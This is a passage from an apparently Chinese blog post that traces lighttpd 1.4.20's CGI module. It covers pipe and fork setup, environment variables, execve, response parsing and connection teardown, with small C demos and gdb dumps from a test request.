		close(to_cgi_fds[0]);					// close(to_cgi_fds[read])
		/* not needed */
		close(to_cgi_fds[1]);					// close(to_cgi_fds[write]);
        
```

如果你不太理解上述代码的对“管道的操作”，我简化了一下并且画了几张图，自己可以看看：

```c
// 编译命令：gcc -g pipe_fork.c -o pipe_fork
#include <stdio.h>
#include <unistd.h>
#include <sys/wait.h>

int main(){
    int to_cgi_fds[2];
    int from_cgi_fds[2];
	if (pipe(to_cgi_fds)) {		// 创建管道to_cgi_fds：其中to_cgi_fds[0]用于read、to_cgi_fds[1]用于write
		return -1;
	}
	if (pipe(from_cgi_fds)) {	// 创建管道from_cgi_fds：其中from_cgi_fds[0]用于read、from_cgi_fds[1]用于write
        // 创建失败则写入错误日志并返回
		return -1;
	}
    int pid = fork();
    if(pid == 0){	// 子进程
        printf("child process start ...\n");
        /* move stdout to from_cgi_fd[1] */		// 
        close(STDOUT_FILENO);					// close(1)
        dup2(from_cgi_fds[1], STDOUT_FILENO);	// dup2(from_cgi_fds[write],1)： 
        close(from_cgi_fds[1]);					// close(from_cgi_fds[write]):
        
        /* not needed */
        close(from_cgi_fds[0]);					// close(from_cgi_fds[read]);	
    
        /* move the stdin to to_cgi_fd[0] */
        close(STDIN_FILENO);					// close(0);
        dup2(to_cgi_fds[0], STDIN_FILENO);		// dup2(to_cgi_fds[read], 0);
        close(to_cgi_fds[0]);					// close(to_cgi_fds[read])
        /* not needed */
        close(to_cgi_fds[1]);					// close(to_cgi_fds[write]);
    } else if( pid > 0) { 		// 父进程
    	// 暂时不做处理
		printf("waitting for the child process to exit.\r\n");
        int status = 0;
		wait(&status); //等待子进程退出
		printf("the child process has exited,its exit status is %d\r\n", WEXITSTATUS(status)); // 调用宏WEXITSTATUS对status进行解析
    }
    printf("process end ...\n");
	return 0;
}
```

[pipe_fork.pptx](https://www.yuque.com/attachments/yuque/0/2022/pptx/574026/1668732340716-725bb6c4-143b-4199-8f8c-cd51f9b0222a.pptx)

> 不得不吐槽一句，子进程这管道的设置确实有点麻烦...
>

根据我的lighttpd.conf设置（ERRORLOG_FILE），程序会执行如下代码以将stderr重定向到“错误日志的fd”用以保存子进程的错误日志：

```c
		if (srv->errorlog_mode == ERRORLOG_FILE) {
			close(STDERR_FILENO);
			dup2(srv->errorlog_fd, STDERR_FILENO);
		}
```

> + <u>注意，下面的图只是展现了lighttpd管道的创建过程，肯定不准确，看个大概就行</u>
>

![](https://cdn.nlark.com/yuque/0/2022/png/574026/1668732584189-c58b3fdb-9a61-46a5-b1c5-160a6575050a.png)

然后我们切换到父进程视角，开头关闭了两个fd：

```c
	default: {	// 父进程
		handler_ctx *hctx;
		/* father */

		close(from_cgi_fds[1]);
		close(to_cgi_fds[0]);
```

直到现在父子进程的通信过程才建立完毕：

![](https://cdn.nlark.com/yuque/0/2022/png/574026/1668732972190-0749c7c4-f87f-498c-80d2-eec853e520df.png)

总结：在父子进程的通信中，父进程到子进程的部分通信方式由环境变量实现（单向），双向通信则使用管道实现。pipe函数指定管道[0]是读取而[1]是写，它不像`/dev/pts`一样可以任意指定：

```c
#include <stdio.h>
int main(){
    char buffer[0x10]={0};
    read(1,buffer,0x10);	// 一般情况下我们编写代码时会写：read(0,buffer,0x10);
    write(0,buffer,0x10);	// 一般情况下我们编写代码时会写：write(1,buffer,0x10);
    return 0;
}
```

![](https://cdn.nlark.com/yuque/0/2022/png/574026/1668735518117-19547991-43c3-4649-ade2-31cc7c62d1bb.png)

```c
#include <stdio.h>
#include <unistd.h>
#include <sys/wait.h>
int main(){
    int pipe_fds[2];
    char buffer1[0x10]={0};
    char buffer2[0x10]={0};
    pipe(pipe_fds);
    printf("test1-------------------------------\n");
    write(pipe_fds[0],"cyberangel\n",0x10);
    read(pipe_fds[1],buffer1,0x10);
    write(1,buffer1,0x10);
    printf("test2-------------------------------\n");
    write(pipe_fds[1],"cyberangel\n",0x10);
    read(pipe_fds[0],buffer2,0x10);
    write(1,buffer2,0x10);
    return 0;
}
```

![](https://cdn.nlark.com/yuque/0/2022/png/574026/1668735506338-9b7e2f6a-785e-4e9e-afda-6a4b454e3067.png)

#### ②、建立子进程运行环境并执行cgi
下面的代码逻辑很简单，大部分都是通过con结构体去设置子进程相关的环境变量，没有太大的难度，最后执行了execve：

```c
/* create environment */
		env.ptr = NULL;		// char_array *env 存放有关每一个子进程（cgi）环境变量的信息，本质为结构体
		env.size = 0;
		env.used = 0;

		cgi_env_add(&env, CONST_STR_LEN("SERVER_SOFTWARE"), CONST_STR_LEN(PACKAGE_NAME"/"PACKAGE_VERSION));  // SERVER_SOFTWARE == lighttpd/1.4.20

		if (!buffer_is_empty(con->server_name)) {
			cgi_env_add(&env, CONST_STR_LEN("SERVER_NAME"), CONST_BUF_LEN(con->server_name));	
		} else {
#ifdef HAVE_IPV6
			s = inet_ntop(srv_sock->addr.plain.sa_family,
				      srv_sock->addr.plain.sa_family == AF_INET6 ?
				      (const void *) &(srv_sock->addr.ipv6.sin6_addr) :
				      (const void *) &(srv_sock->addr.ipv4.sin_addr),
				      b2, sizeof(b2)-1);
#else
			s = inet_ntoa(srv_sock->addr.ipv4.sin_addr);
#endif
			cgi_env_add(&env, CONST_STR_LEN("SERVER_NAME"), s, strlen(s));
		} // SERVER_NAME == www.example.org
		cgi_env_add(&env, CONST_STR_LEN("GATEWAY_INTERFACE"), CONST_STR_LEN("CGI/1.1")); // GATEWAY_INTERFACE=CGI/1.1

		s = get_http_version_name(con->request.http_version);

		cgi_env_add(&env, CONST_STR_LEN("SERVER_PROTOCOL"), s, strlen(s)); // SERVER_PROTOCOL=HTTP/1.1

		LI_ltostr(buf,
#ifdef HAVE_IPV6
			ntohs(srv_sock->addr.plain.sa_family == AF_INET6 ? srv_sock->addr.ipv6.sin6_port : srv_sock->addr.ipv4.sin_port)
#else
			ntohs(srv_sock->addr.ipv4.sin_port)
#endif
			);
		cgi_env_add(&env, CONST_STR_LEN("SERVER_PORT"), buf, strlen(buf));

#ifdef HAVE_IPV6
		s = inet_ntop(srv_sock->addr.plain.sa_family,
			      srv_sock->addr.plain.sa_family == AF_INET6 ?
			      (const void *) &(srv_sock->addr.ipv6.sin6_addr) :
			      (const void *) &(srv_sock->addr.ipv4.sin_addr),
			      b2, sizeof(b2)-1);
#else
		s = inet_ntoa(srv_sock->addr.ipv4.sin_addr);
#endif
		cgi_env_add(&env, CONST_STR_LEN("SERVER_ADDR"), s, strlen(s));	// SERVER_PORT=2048

		s = get_http_method_name(con->request.http_method);				
		cgi_env_add(&env, CONST_STR_LEN("REQUEST_METHOD"), s, strlen(s));	// REQUEST_METHOD=POST

		if (!buffer_is_empty(con->request.pathinfo)) {
			cgi_env_add(&env, CONST_STR_LEN("PATH_INFO"), CONST_BUF_LEN(con->request.pathinfo));
		}
		cgi_env_add(&env, CONST_STR_LEN("REDIRECT_STATUS"), CONST_STR_LEN("200"));	// REDIRECT_STATUS=200
		if (!buffer_is_empty(con->uri.query)) {
			cgi_env_add(&env, CONST_STR_LEN("QUERY_STRING"), CONST_BUF_LEN(con->uri.query));
		}
		if (!buffer_is_empty(con->request.orig_uri)) {
			cgi_env_add(&env, CONST_STR_LEN("REQUEST_URI"), CONST_BUF_LEN(con->request.orig_uri));	// REQUEST_URI=/calculate.cgi
		}


#ifdef HAVE_IPV6
		s = inet_ntop(con->dst_addr.plain.sa_family,
			      con->dst_addr.plain.sa_family == AF_INET6 ?
			      (const void *) &(con->dst_addr.ipv6.sin6_addr) :
			      (const void *) &(con->dst_addr.ipv4.sin_addr),
			      b2, sizeof(b2)-1);
#else
		s = inet_ntoa(con->dst_addr.ipv4.sin_addr);
#endif
		cgi_env_add(&env, CONST_STR_LEN("REMOTE_ADDR"), s, strlen(s));	// REMOTE_ADDR=127.0.0.1	

		LI_ltostr(buf,
#ifdef HAVE_IPV6
			ntohs(con->dst_addr.plain.sa_family == AF_INET6 ? con->dst_addr.ipv6.sin6_port : con->dst_addr.ipv4.sin_port)
#else
			ntohs(con->dst_addr.ipv4.sin_port)
#endif
			);
		cgi_env_add(&env, CONST_STR_LEN("REMOTE_PORT"), buf, strlen(buf));	// REMOTE_PORT=35346

		if (!buffer_is_empty(con->authed_user)) {
			cgi_env_add(&env, CONST_STR_LEN("REMOTE_USER"),
				    CONST_BUF_LEN(con->authed_user));
		}

#ifdef USE_OPENSSL
	if (srv_sock->is_ssl) {
		cgi_env_add(&env, CONST_STR_LEN("HTTPS"), CONST_STR_LEN("on"));
	}
#endif

		/* request.content_length < SSIZE_MAX, see request.c */
		LI_ltostr(buf, con->request.content_length);
		cgi_env_add(&env, CONST_STR_LEN("CONTENT_LENGTH"), buf, strlen(buf));	// CONTENT_LENGTH=7	
		cgi_env_add(&env, CONST_STR_LEN("SCRIPT_FILENAME"), CONST_BUF_LEN(con->physical.path));
    	// SCRIPT_FILENAME=/home/cyberangel/Desktop/lighttpd1.4-lighttpd-1.4.20/tests/tmp/lighttpd/servers/www.example.org/pages/calculate.cgi
		cgi_env_add(&env, CONST_STR_LEN("SCRIPT_NAME"), CONST_BUF_LEN(con->uri.path));	// SCRIPT_NAME=/calculate.cgi
		cgi_env_add(&env, CONST_STR_LEN("DOCUMENT_ROOT"), CONST_BUF_LEN(con->physical.doc_root));
    	// DOCUMENT_ROOT=/home/cyberangel/Desktop/lighttpd1.4-lighttpd-1.4.20/tests/tmp/lighttpd/servers/www.example.org/pages/

		/* for valgrind */
		if (NULL != (s = getenv("LD_PRELOAD"))) {
			cgi_env_add(&env, CONST_STR_LEN("LD_PRELOAD"), s, strlen(s));
		}

		if (NULL != (s = getenv("LD_LIBRARY_PATH"))) {
			cgi_env_add(&env, CONST_STR_LEN("LD_LIBRARY_PATH"), s, strlen(s));
		}
#ifdef __CYGWIN__
		/* CYGWIN needs SYSTEMROOT */
		if (NULL != (s = getenv("SYSTEMROOT"))) {
			cgi_env_add(&env, CONST_STR_LEN("SYSTEMROOT"), s, strlen(s));
		}
#endif

		// 此处省略代码，被省略的代码为cgi设置如下的环境变量，这里不再展示：
    	/*
            // 0x555555882920 "HTTP_HOST=192.168.2.196:1234", 
            // 0x555555882950 "HTTP_CONNECTION=keep-alive", 
            // 0x555555882a90 "HTTP_CONTENT_LENGTH=7", 
            // 0x555555882ab0 "HTTP_CACHE_CONTROL=max-age=0", 
            // 0x555555882ae0 "HTTP_UPGRADE_INSECURE_REQUESTS=1", 
            // 0x555555882b10 "HTTP_ORIGIN=http://192.168.2.196:1234", 
            // 0x555555882b40 "CONTENT_TYPE=application/x-www-form-urlencoded", 
            // 0x555555882590 "HTTP_USER_AGENT=Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36", 
            // 0x555555882b80 "HTTP_ACCEPT=text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9", 
            // 0x555555882c20 "HTTP_REFERER=http://192.168.2.196:1234/calculate.html", 
            // 0x555555882c60 "HTTP_ACCEPT_ENCODING=gzip, deflate", 
            // 0x555555882c90 "HTTP_ACCEPT_LANGUAGE=zh-CN,zh;q=0.9", 
            // 0x555555882cc0 "HTTP_FOO=foo", 
            // 0x555555882ce0 "TRAC_ENV=tracenv", 
            // 0x555555882d00 "SETENV=setenv", 
		*/

		openDevNull(STDERR_FILENO);					// 将stderr重定向到/dev/null(linux)、Windows则是nul

		/* we don't need the client socket */
		for (i = 3; i < 256; i++) {
			if (i != srv->errorlog_fd) close(i);	// 关闭子进程的大于等于3的fd
		}

		/* exec the cgi */
		execve(args[0], args, env.ptr);

		/* log_error_write(srv, __FILE__, __LINE__, "sss", "CGI failed:", strerror(errno), args[0]); */

		/* */
		SEGFAULT();
		break;
	}
```

#### ③、父进程向子进程发送数据
其间涉及的`FILE_CHUNK`、 `MEM_CHUNK`的区别本篇文章并不讨论，两者只保留关键的代码，过程同样的十分简单：

```c
	default: {
		handler_ctx *hctx;
		/* father */

		close(from_cgi_fds[1]);			// 关闭from_cgi_fds[1]
		close(to_cgi_fds[0]);			// 关闭to_cgi_fds[0]

		if (con->request.content_length) {
			chunkqueue *cq = con->request_content_queue;
			chunk *c;

			assert(chunkqueue_length(cq) == (off_t)con->request.content_length);

			/* there is content to send */
			for (c = cq->first; c; c = cq->first) {
				int r = 0;

				/* copy all chunks */
				switch(c->type) {
				case FILE_CHUNK:
					// 代码省略...
					if ((r = write(to_cgi_fds[1], c->file.mmap.start + c->offset, c->file.length - c->offset)) < 0) {
                        // 通过向父进程的to_cgi_fds[1]写入数据，将数据发送到子进程的stdin(to_cgi_fds[0]),用来让子进程接收输入
                        // 若此过程中发生错误，则根据errno错误码设置返回的状态（con->http_status）
						switch(errno) {
						case ENOSPC:
							con->http_status = 507;
							break;
						case EINTR:
							continue;
						default:
							con->http_status = 403;
							break;
						}
					}
					break;
				case MEM_CHUNK:
					if ((r = write(to_cgi_fds[1], c->mem->ptr + c->offset, c->mem->used - c->offset - 1)) < 0) {	// 这里也是一样的
						switch(errno) {
						case ENOSPC:
							con->http_status = 507;
							break;
						case EINTR:
							continue;
						default:
							con->http_status = 403;
							break;
						}
					}
					break;
				case UNUSED_CHUNK:
					break;
				}

				if (r > 0) {
					c->offset += r;
					cq->bytes_out += r;
				} else {
					log_error_write(srv, __FILE__, __LINE__, "ss", "write() failed due to: ", strerror(errno)); 
					con->http_status = 500;
					break;
				}
				chunkqueue_remove_finished_chunks(cq);
			}
		}
		// 省略...
		break;
	}
```

### 2、关于cgi_handle_fdevent函数
`cgi_handle_fdevent`主要是用来接收cgi返回的数据，它注册于父进程的`default`分支中，当cgi处理结束之后会自动调用该函数：

```c
	default: {
		handler_ctx *hctx;
		// 代码省略...
		fdevent_register(srv->ev, hctx->fd, cgi_handle_fdevent, hctx);		// fd事件注册
		fdevent_event_add(srv->ev, &(hctx->fde_ndx), hctx->fd, FDEVENT_IN);	// FDEVENT_IN表示读取cgi返回的请求

    	// 代码省略...

		break;
	}
```

可以对`cgi_handle_fdevent`下个断点，重新发送请求查看栈帧，发现函数由main函数直接调用：

![](https://cdn.nlark.com/yuque/0/2022/png/574026/1668564391471-bb2388c3-6a0a-4e6e-bb09-627a78485951.png)

![](https://cdn.nlark.com/yuque/0/2022/png/574026/1668564450634-73c7f8ae-77ca-416b-8f38-4b2cbd20265f.png)

`FDEVENT_IN`表示读取cgi返回的请求，我们只看该部分：

```c
static handler_t cgi_handle_fdevent(void *s, void *ctx, int revents) {
	server      *srv  = (server *)s;
	handler_ctx *hctx = ctx;
	connection  *con  = hctx->remote_conn;

	joblist_append(srv, con);

	if (hctx->fd == -1) {
		log_error_write(srv, __FILE__, __LINE__, "ddss", con->fd, hctx->fd, connection_get_state(con->state), "invalid cgi-fd");

		return HANDLER_ERROR;
	}

	if (revents & FDEVENT_IN) {		// 读取cgi返回的请求
		switch (cgi_demux_response(srv, hctx)) {
		case FDEVENT_HANDLED_NOT_FINISHED:
			break;
		case FDEVENT_HANDLED_FINISHED:
			/* we are done */

#if 0
			log_error_write(srv, __FILE__, __LINE__, "ddss", con->fd, hctx->fd, connection_get_state(con->state), "finished");
#endif
			cgi_connection_close(srv, hctx);

			/* if we get a IN|HUP and have read everything don't exec the close twice */
			return HANDLER_FINISHED;
		case FDEVENT_HANDLED_ERROR:
			connection_set_state(srv, con, CON_STATE_HANDLE_REQUEST);
			con->http_status = 500;
			con->mode = DIRECT;

			log_error_write(srv, __FILE__, __LINE__, "s", "demuxer failed: ");
			break;
		}
	}
    // 代码省略...
	return HANDLER_FINISHED;
}

```

主要的数据处理被定义在`cgi_demux_response`函数中。

#### ①、接收cgi返回的数据（响应包）
```c
static int cgi_demux_response(server *srv, handler_ctx *hctx) {
	plugin_data *p    = hctx->plugin_data;
	connection  *con  = hctx->remote_conn;

	while(1) {
		int n;

		buffer_prepare_copy(hctx->response, 1024);
		if (-1 == (n = read(hctx->fd, hctx->response->ptr, hctx->response->size - 1))) {
			if (errno == EAGAIN || errno == EINTR) {
				/* would block, wait for signal */
				return FDEVENT_HANDLED_NOT_FINISHED;
			}
			/* error */
			log_error_write(srv, __FILE__, __LINE__, "sdd", strerror(errno), con->fd, hctx->fd);
			return FDEVENT_HANDLED_ERROR;
		}
    // 代码省略...
    }
}
```

该函数的开头会使用read函数去读取cgi返回之后的数据（文件描述符为`hctx->fd`）到`hctx->response->ptr`，因为在编译的过程中gcc会将hctx优化（optimized out）掉，导致在调试的时候我们无法获取该结构体中的值，所以这里我们先记录一些地址：

![](https://cdn.nlark.com/yuque/0/2022/png/574026/1668573555911-d898876c-90ca-4e2a-8e30-2dce415e6335.png)

```c
hctx->fd == 10

*hctx->response = {	// &hctx->response == (buffer **) 0x555555884900
                    // hctx->response == (buffer *) 0x555555882d50
    ptr = 0x0, 	// &ptr == (char **) 0x555555882d50
    used = 0, 	// &used == (size_t *) 0x555555882d58
    size = 0,	// &size == (size_t *) 0x555555882d60
}
```

同时在gdb窗口中观察到read函数的返回地址为`0x00007ffff58e0a76`：

![](https://cdn.nlark.com/yuque/0/2022/png/574026/1668573691807-30ad554b-b2c4-4d8e-a2ab-340578c8b2f7.png)

下断点，调试到此处，查看：

```c
(gdb) x/gx 0x555555882d50
0x555555882d50:	0x0000555555884920
(gdb) x/6s 0x0000555555884920
0x555555884920:	"Content-Type:text/html\n\n<meta charset=\"utf-8\"><TITLE>乘法结果</TITLE> <H3>乘法结果</H3> User's request_method is POST\n<P>111 * 222 = 24642 \n"
0x5555558849b5:	""
0x5555558849b6:	""
0x5555558849b7:	""
0x5555558849b8:	""
0x5555558849b9:	""
```

如上所示，子进程通过pipe将结果返回给了父进程。接下来又是一大串的有关数据处理的代码，看代码似乎是为了同时兼容nph与cgi才这么长：

```c
static int cgi_demux_response(server *srv, handler_ctx *hctx) {
	plugin_data *p    = hctx->plugin_data;
	connection  *con  = hctx->remote_conn;

	while(1) {
		int n;

		buffer_prepare_copy(hctx->response, 1024);
		if (-1 == (n = read(hctx->fd, hctx->response->ptr, hctx->response->size - 1))) {
        	// 读取cgi返回的内容到hctx->response->ptr
		}

		if (n == 0) {								// 当n为0时表示正文已经读取完整
			/* read finished */

			con->file_finished = 1;

			/* send final chunk */
			http_chunk_append_mem(srv, con, NULL, 0);
			joblist_append(srv, con);

			return FDEVENT_HANDLED_FINISHED;		// 最终会在此处返回
		}

		hctx->response->ptr[n] = '\0';
		hctx->response->used = n+1;					// used表示cgi返回的请求头大小

		/* split header from body */

		if (con->file_started == 0) {
			int is_header = 0;
			int is_header_end = 0;
			size_t last_eol = 0;
			size_t i;

			buffer_append_string_buffer(hctx->response_header, hctx->response);

			/**
			 * we have to handle a few cases:
			 *
			 * nph:
			 * 
			 *   HTTP/1.0 200 Ok\n
			 *   Header: Value\n
			 *   \n
			 *
			 * CGI:
			 *   Header: Value\n
			 *   Status: 200\n
			 *   \n
			 *
			 * and different mixes of \n and \r\n combinations
			 * 
			 * Some users also forget about CGI and just send a response and hope 
			 * we handle it. No headers, no header-content seperator
			 * 
			 */
			
			/* nph (non-parsed headers) */
			if (0 == strncmp(hctx->response_header->ptr, "HTTP/1.", 7)) is_header = 1;
				
			for (i = 0; !is_header_end && i < hctx->response_header->used - 1; i++) {
				char c = hctx->response_header->ptr[i];		// 遍历cgi返回内容的每一个字符以方便匹配处理

				switch (c) {
				case ':':
					/* we found a colon
					 *
					 * looks like we have a normal header 
					 */
					is_header = 1;							
					break;									
				case '\n':
					/* EOL */
					if (is_header == 0) {
						/* we got a EOL but we don't seem to got a HTTP header */
						is_header_end = 1;
						break;				
					}
                        
					/**
					 * check if we saw a \n(\r)?\n sequence 
					 */
					if (last_eol > 0 && 
					    ((i - last_eol == 1) || 
					     (i - last_eol == 2 && hctx->response_header->ptr[i - 1] == '\r'))) {
						is_header_end = 1;
						break;					
					}
					last_eol = i;
					break;			
				}
			}

			if (is_header_end) {
				if (!is_header) {
					/* no header, but a body */

					if (con->request.http_version == HTTP_VERSION_1_1) {
						con->response.transfer_encoding = HTTP_TRANSFER_ENCODING_CHUNKED;
					}

					http_chunk_append_mem(srv, con, hctx->response_header->ptr, hctx->response_header->used);
					joblist_append(srv, con);
				} else {
					const char *bstart;
					size_t blen;
					
					/**
					 * i still points to the char after the terminating EOL EOL
					 *
					 * put it on the last \n again
					 */
					i--;
					
					/* the body starts after the EOL */
					bstart = hctx->response_header->ptr + (i + 1);
					blen = (hctx->response_header->used - 1) - (i + 1);
					
					/* string the last \r?\n */
					if (i > 0 && (hctx->response_header->ptr[i - 1] == '\r')) {
						i--;
					}

					hctx->response_header->ptr[i] = '\0';
					hctx->response_header->used = i + 1; /* the string + \0 */
					
					/* parse the response header */
					cgi_response_parse(srv, con, p, hctx->response_header);		// 解析响应头，进入cgi_response_parse函数

					/* enable chunked-transfer-encoding */
					if (con->request.http_version == HTTP_VERSION_1_1 &&
					    !(con->parsed_response & HTTP_CONTENT_LENGTH)) {
						con->response.transfer_encoding = HTTP_TRANSFER_ENCODING_CHUNKED;	// 上面函数调用完成之后进入此if
					}

					if (blen > 0) {
						http_chunk_append_mem(srv, con, bstart, blen + 1);
						joblist_append(srv, con);
					}
				}

				con->file_started = 1;
			}
		} else {
			http_chunk_append_mem(srv, con, hctx->response->ptr, hctx->response->used);
			joblist_append(srv, con);
		}

#if 0
		log_error_write(srv, __FILE__, __LINE__, "ddss", con->fd, hctx->fd, connection_get_state(con->state), b->ptr);
#endif
	}

	return FDEVENT_HANDLED_NOT_FINISHED;
}
```

#### ②、处理cgi返回数据中有关响应包的header部分
就像`cgi_demux_response`函数中注释的一样（parse the response header），`cgi_response_parse`用来解析cgi返回的header，函数调用如下：

```c
cgi_response_parse(srv, con, p, hctx->response_header);		// 解析响应头，进入cgi_response_parse函数	// 函数调用
static int cgi_response_parse(server *srv, connection *con, plugin_data *p, buffer *in) {			// 函数原型
    /* 
		srv == 0x555555781260
    	con == 0x5555557cda10
    	p == 0x5555557a9c60
    	in == 0x5555558845c0
	*/
}
// *in == {ptr = 0x555555883d70 "Content-Type:text/html\n", used = 24, size = 192}
(gdb) x/4s in->ptr
0x555555883d70:	"Content-Type:text/html\n"
0x555555883d88:	"<meta charset=\"utf-8\"><TITLE>乘法结果</TITLE> <H3>乘法结果</H3> User's request_method is POST\n<P>111 * 222 = 24642 \n"
0x555555883e05:	""
0x555555883e06:	""

```

过程很简单，这里就不再多说了，整个解析过程依赖响应包的header（p->parse_response->ptr）来处理：

![](https://cdn.nlark.com/yuque/0/2022/png/574026/1668737392478-09685d18-7397-4842-b272-757f0671fc86.png)

cgi返回的只有Conten-Type，所以下面的循环只会进行一次：

```c
static int cgi_response_parse(server *srv, connection *con, plugin_data *p, buffer *in) {
    // 代码省略 ... 
	for (s = p->parse_response->ptr;
         /*
        	(gdb) x/16s p->parse_response->ptr
            0x55555587fb30:	"Content-Type:text/html\n"
            0x55555587fb48:	""
    	*/
	     NULL != (ns = strchr(s, '\n'));
	     s = ns + 1, line++) {
        	// 代码省略 ... 

		if (line == 0 &&
		    0 == strncmp(s, "HTTP/1.", 7)) {					
			/* non-parsed header ... we parse them anyway */
        	// 代码省略 ... 
		} else {
			/* parse the headers */
			key = s;
			if (NULL == (value = strchr(s, ':'))) {
				/* we expect: "<key>: <value>\r\n" */
				continue;
			}

			key_len = value - key;
			value += 1;

			/* skip LWS */
			while (*value == ' ' || *value == '\t') value++;

			if (NULL == (ds = (data_string *)array_get_unused_element(con->response.headers, TYPE_STRING))) {
				ds = data_response_init();
			}
			buffer_copy_string_len(ds->key, key, key_len);
			buffer_copy_string(ds->value, value);

			array_insert_unique(con->response.headers, (data_unset *)ds);

			switch(key_len) {
			case 4:
				if (0 == strncasecmp(key, "Date", key_len)) {			// 解析HTTP_DATE
					con->parsed_response |= HTTP_DATE;
				}
				break;
			case 6:
				if (0 == strncasecmp(key, "Status", key_len)) {			// 解析HTTP_STATUS
					con->http_status = strtol(value, NULL, 10);
					con->parsed_response |= HTTP_STATUS;
				}
				break;
			case 8:
				if (0 == strncasecmp(key, "Location", key_len)) {		// 解析HTTP_LOCATION
					con->parsed_response |= HTTP_LOCATION;
				}
				break;
			case 10:
				if (0 == strncasecmp(key, "Connection", key_len)) {		// 解析HTTP_CONNECTION
					con->response.keep_alive = (0 == strcasecmp(value, "Keep-Alive")) ? 1 : 0;
					con->parsed_response |= HTTP_CONNECTION;
				}
				break;
			case 14:
				if (0 == strncasecmp(key, "Content-Length", key_len)) { // 解析HTTP_CONTENT_LENGTH
					con->response.content_length = strtol(value, NULL, 10);
					con->parsed_response |= HTTP_CONTENT_LENGTH;
				}
				break;
			default:
				break;
			}
		}
	}

	/* CGI/1.1 rev 03 - 7.2.1.2 */
	if ((con->parsed_response & HTTP_LOCATION) &&
	    !(con->parsed_response & HTTP_STATUS)) {	// 如果无法判断出HTTP_STATUS，则会将响应包的状态设置为302
		con->http_status = 302;
	}
	return 0;
}
```

最终会在此处返回：

```c
static int cgi_demux_response(server *srv, handler_ctx *hctx) {
	plugin_data *p    = hctx->plugin_data;
	connection  *con  = hctx->remote_conn;

	while(1) {
		int n;

		buffer_prepare_copy(hctx->response, 1024);
		if (-1 == (n = read(hctx->fd, hctx->response->ptr, hctx->response->size - 1))) {
        	// 读取cgi返回的内容到hctx->response->ptr
		}

		if (n == 0) {								// 当n为0时表示正文已经读取完整
			/* read finished */

			con->file_finished = 1;

			/* send final chunk */
			http_chunk_append_mem(srv, con, NULL, 0);
			joblist_append(srv, con);

			return FDEVENT_HANDLED_FINISHED;		// 最终会在此处返回
		}
        // ...
    }
    // ...
}
```

现在数据处理完了，该关闭链接了，调用`cgi_connection_close`函数：

```c
static handler_t cgi_handle_fdevent(void *s, void *ctx, int revents) {
	server      *srv  = (server *)s;
	handler_ctx *hctx = ctx;
	connection  *con  = hctx->remote_conn;

	joblist_append(srv, con);

	if (hctx->fd == -1) {
		log_error_write(srv, __FILE__, __LINE__, "ddss", con->fd, hctx->fd, connection_get_state(con->state), "invalid cgi-fd");

		return HANDLER_ERROR;
	}

	if (revents & FDEVENT_IN) {
		switch (cgi_demux_response(srv, hctx)) {
		case FDEVENT_HANDLED_NOT_FINISHED:
			break;
		case FDEVENT_HANDLED_FINISHED:
			/* we are done */

#if 0
			log_error_write(srv, __FILE__, __LINE__, "ddss", con->fd, hctx->fd, connection_get_state(con->state), "finished");
#endif
			cgi_connection_close(srv, hctx);	// 进入此函数

			/* if we get a IN|HUP and have read everything don't exec the close twice */
			return HANDLER_FINISHED;
		case FDEVENT_HANDLED_ERROR:
			connection_set_state(srv, con, CON_STATE_HANDLE_REQUEST);
			con->http_status = 500;
			con->mode = DIRECT;

			log_error_write(srv, __FILE__, __LINE__, "s", "demuxer failed: ");
			break;
		}
	}
```

#### ③、关闭连接并杀死子进程
整个流程如下：

```c
static handler_t cgi_connection_close(server *srv, handler_ctx *hctx) {
	int status;
	pid_t pid;
	plugin_data *p;
	connection  *con;

	if (NULL == hctx) return HANDLER_GO_ON;

	p    = hctx->plugin_data;
	con  = hctx->remote_conn;

	if (con->mode != p->id) return HANDLER_GO_ON;

#ifndef __WIN32

	/* the connection to the browser went away, but we still have a connection
	 * to the CGI script
	 *
	 * close cgi-connection
	 */

	if (hctx->fd != -1) {
		/* close connection to the cgi-script */
		fdevent_event_del(srv->ev, &(hctx->fde_ndx), hctx->fd);
		fdevent_unregister(srv->ev, hctx->fd);

        /* 
			上面这两行代码对应着cgi_handle_fdevent函数的：
    		fdevent_register(srv->ev, hctx->fd, cgi_handle_fdevent, hctx);		// fd事件注册
    		fdevent_event_add(srv->ev, &(hctx->fde_ndx), hctx->fd, FDEVENT_IN);	// FDEVENT_IN表示读取cgi返回的请求
        */
        
		if (close(hctx->fd)) {	// close通信的文件描述符（pipe）
			log_error_write(srv, __FILE__, __LINE__, "sds", "cgi close failed ", hctx->fd, strerror(errno));
		}

		hctx->fd = -1;			// 将父进程读取子进程传来的数据的文件描述符设置为-1，设置前该值为10
		hctx->fde_ndx = -1;
	}

	pid = hctx->pid;			// 获取子进程pid

	con->plugin_ctx[p->id] = NULL;

	/* is this a good idea ? */
	cgi_handler_ctx_free(hctx);

	/* if waitpid hasn't been called by response.c yet, do it here */
	if (pid) {
		/* check if the CGI-script is already gone */
		switch(waitpid(pid, &status, WNOHANG)) {	// 检查子进程是否已经结束
		case 0:
			/* not finished yet */
#if 0
			log_error_write(srv, __FILE__, __LINE__, "sd", "(debug) child isn't done yet, pid:", pid);
#endif
			break;
		case -1:
			/* */
			if (errno == EINTR) break;

			/*
			 * errno == ECHILD happens if _subrequest catches the process-status before
			 * we have read the response of the cgi process
			 *
			 * -> catch status
			 * -> WAIT_FOR_EVENT
			 * -> read response
			 * -> we get here with waitpid == ECHILD
			 *
			 */
			if (errno == ECHILD) return HANDLER_GO_ON;

			log_error_write(srv, __FILE__, __LINE__, "ss", "waitpid failed: ", strerror(errno));
			return HANDLER_ERROR;
		default:
			/* Send an error if we haven't sent any data yet */
			if (0 == con->file_started) {
				connection_set_state(srv, con, CON_STATE_HANDLE_REQUEST);
				con->http_status = 500;
				con->mode = DIRECT;
			}

			if (WIFEXITED(status)) {
#if 0
				log_error_write(srv, __FILE__, __LINE__, "sd", "(debug) cgi exited fine, pid:", pid);
#endif
				pid = 0;

				return HANDLER_GO_ON;
			} else {
				log_error_write(srv, __FILE__, __LINE__, "sd", "cgi died, pid:", pid);
				pid = 0;
				return HANDLER_GO_ON;
			}
		}


		kill(pid, SIGTERM);		// 若子进程无法结束则kill掉

		/* cgi-script is still alive, queue the PID for removal */
		cgi_pid_add(srv, p, pid);
	}
#endif
	return HANDLER_GO_ON;
}
```

